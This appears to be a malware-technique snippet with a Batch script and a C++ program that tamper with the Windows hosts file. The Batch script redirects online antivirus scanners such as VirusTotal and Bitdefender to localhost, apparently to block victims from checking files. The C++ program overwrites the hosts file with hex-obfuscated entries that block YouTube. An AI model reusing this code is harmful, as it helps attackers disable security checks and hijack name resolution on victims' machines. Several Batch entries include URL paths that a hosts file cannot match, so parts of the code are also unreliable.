# Modify DNS Hosts

## Scripting

### Batch

```batch
@echo off

cd "C:\Windows\System32\Drivers\etc"
echo 127.0.0.1 quickscan.bitdefender.com >> "Hosts"
echo 127.0.0.1 www.pandasecurity.com/activescan/index >> "Hosts"
echo 127.0.0.1 housecall.trendmicro.com >> "Hosts"
echo 127.0.0.1 www.f-secure.com/en/web/home_global/online-scanner >> "Hosts"
echo 127.0.0.1 virscan.org >> "Hosts"
echo 127.0.0.1 www.virustotal.com >> "Hosts"
echo 127.0.0.1 virusscan.jotti.org/en >> "Hosts"
echo 127.0.0.1 www.eset.com/us/online-scanner >> "Hosts"
echo 127.0.0.1 www.metascan-online.com/ >> "Hosts"
echo 127.0.0.1 www.bullguard.com/bullguard-security-center/pc-security/computer-threats/online_virus_scan.aspx >> "Hosts"
```

## WinAPI

### C++

```cpp
#include <windows.h>

DWORD WINAPI OverwriteHosts() {
    char data[] = {
        0x31, 0x32, 0x37, 0x2E, 0x30, 0x2E, 0x30, 0x2E, 0x31, 0x20,
        0x77, 0x77, 0x77, 0x2E, 0x79, 0x6F, 0x75, 0x74, 0x75, 0x62,
        0x65, 0x2E, 0x63, 0x6F, 0x6D, 0x0A,
        0x31, 0x32, 0x37, 0x2E, 0x30, 0x2E, 0x30, 0x2E, 0x31, 0x20,
        0x79, 0x6F, 0x75, 0x74, 0x75, 0x62, 0x65, 0x2E, 0x63, 0x6F,
        0x6D, 0x0A
    };
    char path[60];
    DWORD write;

    ::GetEnvironmentVariable("WINDIR", path, sizeof(path));
    strcat(path, "\\System32\\drivers\\etc\\hosts");
    HANDLE handle_file = ::CreateFile(path, GENERIC_ALL, NULL, NULL, CREATE_ALWAYS, NULL, NULL);
    ::WriteFile(handle_file, data, sizeof(data), &write, NULL);
    ::CloseHandle(handle_file);

    return 0;
}

INT WINAPI wWinMain(
_In_ HINSTANCE hInstance,
_In_opt_ HINSTANCE PrevInstance,
_In_ PWSTR szCmdLine,
_In_ INT nShowCmd
) {
    ::CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)OverwriteHosts, NULL, 0, NULL);
    ::Sleep(1000); // Wait for the thread to complete
    return 0;
}
```